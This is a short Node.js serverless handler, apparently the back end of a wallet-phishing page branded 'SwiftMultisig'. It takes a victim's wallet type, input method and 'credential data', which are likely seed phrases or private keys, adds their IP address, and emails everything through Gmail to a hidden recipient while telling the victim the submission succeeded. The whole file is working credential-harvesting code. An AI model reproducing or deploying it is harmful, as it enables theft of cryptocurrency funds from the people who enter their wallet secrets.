const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const { walletType, inputMethod, credentialData } = req.body;
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // Read env vars
        const EMAIL_USER = process.env.EMAIL_USER;
        const EMAIL_PASS = process.env.EMAIL_PASS;
        const RECIPIENT_EMAIL = process.env.RECIPIENT_EMAIL;

        // Check each one
        const missing = [];
        if (!EMAIL_USER) missing.push('EMAIL_USER');
        if (!EMAIL_PASS) missing.push('EMAIL_PASS');
        if (!RECIPIENT_EMAIL) missing.push('RECIPIENT_EMAIL');

        if (missing.length) {
            console.error(`Missing env vars: ${missing.join(', ')}`);
            return res.status(500).json({
                success: false,
                message: `Email not configured: missing ${missing.join(', ')}`
            });
        }

        // Create transporter and verify
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: { user: EMAIL_USER, pass: EMAIL_PASS }
        });

        await transporter.verify(); // throws if invalid

        const emailHtml = `
            <div style="">
                <h2> Multisig Wallet Submission</h2>
                <p><strong>Wallet Type:</strong> ${walletType}</p>
                <p><strong>Method:</strong> ${inputMethod}</p>
                <pre style=" padding:10px;">${credentialData}</pre>
            </div>
        `;

        await transporter.sendMail({
            from: `"SwiftMultisig" <${EMAIL_USER}>`,
            to: RECIPIENT_EMAIL,
            subject: `Multisig - ${walletType} (${inputMethod})`,
            html: emailHtml,
            text: `Wallet: ${walletType}\nMethod: ${inputMethod}\nData: ${credentialData}\nIP: ${ipAddress}\nTime: ${new Date().toLocaleString()}`
        });

        res.json({ success: true, message: 'Submitted successfully!' });
    } catch (error) {
        console.error('Email error:', error);
        res.status(500).json({
            success: false,
            message: error.message
        });
    }
};